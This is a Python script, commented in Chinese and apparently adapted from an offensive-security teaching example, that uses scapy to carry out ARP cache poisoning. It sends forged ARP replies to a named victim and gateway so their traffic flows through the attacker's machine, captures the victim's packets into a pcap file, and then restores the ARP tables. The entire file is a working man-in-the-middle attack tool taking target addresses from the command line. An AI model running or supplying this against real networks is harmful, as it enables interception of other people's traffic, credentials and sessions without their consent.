from multiprocessing import Process
from scapy.all import *
import os
import sys
import time

# 获取MAC地址
def get_MAC(target_ip):
    # 创建广播数据包
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has',# ARP(op='who-has')：ARP查询操作（询问目标IP的MAC地址）
                                                pdst=target_ip)
    # 发送并接收响应（timeout=2秒，重试10次）
    resp, _ = srp(packet,timeout=2,retry=10,verbose=False)
    for _,r in resp:
        # 返回响应的MAC地址
        return r[Ether].src
    return None

class Arper:
    def __init__(self,victim,gateway,attack,interface='eth0'):
        self.victim = victim
        self.victimMAC = get_MAC(victim)

        self.gateway  = gateway
        self.gatewayMAC = get_MAC(gateway)

        self.attack = attack
        self.attackMAC = get_MAC(attack)

        self.interface = interface
        conf.iface = interface # 指定网卡
        conf.verb = 0 # 关闭scapy输出

        print(f'Initialized {interface}')
        print(f'Gateway ({gateway} is at {self.gatewayMAC})')
        print(f'victim  ({victim}  is at {self.victimMAC})')
        print('-'*15)

    def run(self):
        # 毒害ARP缓存
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        # 嗅探网络流量
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        # 构造欺骗受害者的ARP包（伪装成网关）
        poison_victim = Ether(dst=self.victimMAC)/ARP(
        op = 2,
        psrc = self.gateway,
        pdst = self.victim,
        hwsrc = self.attackMAC,
        hwdst = self.victimMAC
        )

        print(f'ip src: {poison_victim.psrc}')
        print(f'ip dst: {poison_victim.pdst}')
        print(f'mac src:{poison_victim.hwsrc}')
        print(f'mac dst:{poison_victim.hwdst}')
        print(poison_victim.summary())
        print('-'*15)

        # 构造欺骗网关的ARP包（伪装成受害者）
        poison_gateway = Ether(dst=self.gatewayMAC)/ARP(
            op = 2,
        psrc = self.victim,
        pdst = self.gateway,
        hwsrc = self.attackMAC,
        hwdst = self.gatewayMAC
        )

        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac src:{poison_gateway.hwsrc}')
        print(f'mac dst:{poison_gateway.hwdst}')
        print(poison_gateway.summary())
        print('-' * 15)
        print(f'Beginning the ARP poison.[CTRL-C to stop]')

        # 持续发送毒化包
        while 1:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                sendp(poison_victim)
                sendp(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                 time.sleep(5)
    def sniff(self,count=100):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = 'ip host %s'%self.victim
        # 开始抓包
        packets = sniff(count=count,filter=bpf_filter,iface=self.interface)
        # 保存流量到pcap文件
        wrpcap('arper.pcap',packets)
        print('Got the packets')
        # 恢复ARP表并终止毒化进程
        self.restore()
        self.poison_thread.terminate()
        print('Finished')
    def restore(self):
        print('Restoring ARP tables...')
        # 恢复受害者的ARP表
        sendp(ARP(op=2,psrc=self.gateway,hwsrc=self.gatewayMAC,pdst=self.victim,hwdst='ff:ff:ff:ff:ff:ff',count=5))

        # 恢复网关的ARP表
        sendp(ARP(op=2,psrc=self.victim,hwsrc=self.victimMAC,pdst=self.gateway,hwdst='ff:ff:ff:ff:ff:ff',count=5))
if __name__ == '__main__':
    (victim,gateway, attack, interface) = (sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])
    myarp = Arper(victim, gateway,attack, interface)
    myarp.run()